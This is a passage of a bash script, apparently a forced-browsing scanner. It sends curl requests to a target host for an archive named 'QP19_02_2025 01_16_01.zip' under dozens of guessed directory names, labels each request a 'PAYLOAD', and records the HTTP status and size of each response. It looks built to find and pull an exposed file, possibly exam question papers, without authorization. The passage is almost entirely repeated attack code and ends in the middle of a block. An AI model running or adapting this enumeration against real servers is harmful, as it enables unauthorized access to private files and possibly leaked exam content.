echo -n "Payload [AdminQPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AdminQPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AdminQPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Platform-Q_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Platform-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Platform-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationQPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationQPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationQPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBPortal/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBPortal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBPortal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService-MassUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService-MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService-MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMasterUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMasterUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMasterUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMassUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFile-Transfer/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFile-Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFile-Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Workflow_QPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Workflow_QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Workflow_QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBData_ProcessingSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBData_ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBData_ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManagerTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManagerTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManagerTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSyncQPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSyncQPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSyncQPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPPanel/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPPanel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPPanel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper_AccessControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper_AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper_AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDoc-Panel/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDoc-Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDoc-Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSync-QstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSync-QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSync-QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaperProcessingSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaperProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaperProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchUpload-QPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchUpload-QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchUpload-QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [System_QPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}System_QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}System_QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSystem_QPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSystem_QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSystem_QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploaderMonitoring/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploaderMonitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploaderMonitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P_MonitoringTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P_MonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P_MonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFile_CloudSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFile_CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFile_CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBData_Upload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBData_Upload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBData_Upload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor-AutomationSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor-AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor-AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingModuleQPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingModuleQPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingModuleQPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AccessControl_QPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AccessControl_QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AccessControl_QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor_Tool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor_Tool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor_Tool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Suite-QPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Suite-QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Suite-QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileProcessorQPUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileProcessorQPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileProcessorQPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P-Module/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P-Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P-Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatch-FileUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatch-FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatch-FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader_Ops/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader_Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader_Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper-Module/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper-Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper-Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSystem_QPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSystem_QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSystem_QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSystemQPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSystemQPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSystemQPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFileBatchProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFileBatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFileBatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSystemTestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSystemTestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSystemTestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB_Suite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB_Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
